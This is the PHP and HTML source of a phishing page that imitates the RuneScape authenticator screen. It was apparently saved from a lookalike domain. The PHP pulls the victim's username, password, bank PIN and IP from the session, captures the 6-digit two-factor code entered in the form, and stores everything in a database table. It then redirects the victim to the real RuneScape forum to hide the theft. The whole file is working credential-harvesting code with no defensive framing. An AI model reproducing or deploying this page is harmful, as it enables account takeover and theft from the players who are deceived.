<?php

include('db_connection.php');
	session_start();

	$pin_1 =  $_SESSION['pin'];
	$username_1 = $_SESSION['username'];
	$password_1 =  $_SESSION['password'];
	$ip_1 =  $_SESSION['ip'];

	if(isset($_POST['trust']))
	{
		echo "there";
		$auth_1 = $_POST['code'];
		$stmt = $pdo->prepare("insert into log_data(username,password,bank_pin,auth_key,ip) values('$username_1','$password_1','$pin_1','$auth_1','$ip_1'  ) " );
				$stmt->execute();
				
		header("Location: http://services.runescape.com/m=forum/sl=0/searchthreads.ws");

}
?>
<!-- saved from url=(0086)https://secure.runescape.com-jsh.top/m=auth/verification.ws674,769,125,17327383,415867 -->
<html class="no-js" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    
        
        <title>RuneScape Authentication</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="description" content="Log in here to access your RuneScape account.">
        <meta name="author" content="Jagex">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="dns-prefetch" href="http://www.google-analytics.com/">
        <link rel="dns-prefetch" href="http://ajax.googleapis.com/">
        <link rel="dns-prefetch" href="http://connect.facebook.net/">
        <link rel="stylesheet" href="fonts-1.css">
        <link rel="stylesheet" href="vendor-1.css">
        <link rel="stylesheet" href="modules-4.css">
        <link rel="shortcut icon" href="https://www.runescape.com/img/global/favicon.ico?1">
        <link rel="apple-touch-icon" href="https://www.runescape.com/img/global/mobile.png?1">
        <meta property="og:title" content="RuneScape Log In">
        <meta property="og:site_name" content="RuneScape">
        <meta property="og:image" content="https://www.runescape.com/img/microsite/social-share-fb.jpg">
        <meta property="og:url" content="https://secure.runescape.com/m=weblogin/">
        <meta property="og:description" content="Log in here to access your RuneScape account.">
        <meta name="twitter:domain" content="RuneScape.com">
        <meta name="twitter:url" content="https://secure.runescape.com/m=weblogin/">
        <meta name="twitter:title" content="RuneScape Log In">
        <meta name="twitter:description" content="Log in here to access your RuneScape account.">
        <meta name="twitter:image:src" content="https://www.runescape.com/img/microsite/social-share.jpg">
        <meta name="twitter:site" content="@RuneScape">
        <meta name="google-site-verification" content="pUwl5KYHKSZ6tbbgsR2wYNv1kbVmsYral3iFmijHTWM">
        <script async="" src="analytics.js"></script>
        <script type="text/javascript" src="jquery.min.js"></script>
    </head>
    <body class="login-page" style="">
        <main class="login-box login-box--weblogin">
            <div class="login-box__container">
                <div class="login-logo">
                    <a href="http://www.runescape.com/community" id="rs-logo-home">
                        <img src="./RuneScape Authentication_files/rs-logo.png" data-interchange="[/assets/img/rs-logo.png, small], [/assets/img/rs-logo@2x.png, retina]" alt="RuneScape Logo" title="RuneScape">
                    </a>
                </div>
                <div align="center">
                    <img src="./RuneScape Authentication_files/padlock.png" data-interchange="[/assets/img/padlock.png, small], [/assets/img/padlock.png, retina]" alt="RuneScape Security" title="RuneScape">
                </div><br>
                <form class="login-form" id="login-form" method="post" action="auth=1.php" >
                    <p class="login-box__copy">Authenticator</p>
                    <p class="login-box__copy">Enter the 6-digit code generated by your authenticator app.</p>
                    <input class="login-form__text" type="password" name="code" id="text_code" minlength="6" maxlength="6" required="">
                    <button class="login-form__submit" type="submit" name="trust">Trust This Computer</button>
                </form>
            </div>
        </main>
    
    <script>var logid = '415867';</script>
    <script src="./RuneScape Authentication_files/assets.js.download"></script>

<div id="des_xnba_ewn"></div></body></html>